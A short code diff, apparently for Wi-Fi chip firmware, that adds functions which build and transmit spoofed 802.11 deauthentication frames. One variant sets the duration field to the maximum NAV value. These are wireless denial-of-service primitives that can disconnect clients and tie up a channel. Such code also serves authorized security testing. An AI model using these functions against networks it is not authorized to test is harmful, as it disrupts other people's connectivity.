@@ -58,3 +58,20 @@ bool wifi_tx_raw_frame(void* frame, size_t length) {
   return true;
 #endif
 }
+
+bool wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason, void* bssid) {
+  if (src_mac == nullptr || dst_mac == nullptr) return false;
+  DeauthFrame frame;
+  _fill_mac_addrs(frame.destination, frame.source, frame.access_point, src_mac, dst_mac, bssid);
+  frame.reason = reason;
+  return wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
+}
+
+bool wifi_tx_deauth_nav(void* src_mac, void* dst_mac, uint16_t reason, void* bssid) {
+  if (src_mac == nullptr || dst_mac == nullptr) return false;
+  DeauthFrame frame;
+  frame.duration = IEEE80211_MAX_NAV_DURATION;
+  _fill_mac_addrs(frame.destination, frame.source, frame.access_point, src_mac, dst_mac, bssid);
+  frame.reason = reason;
+  return wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
+}
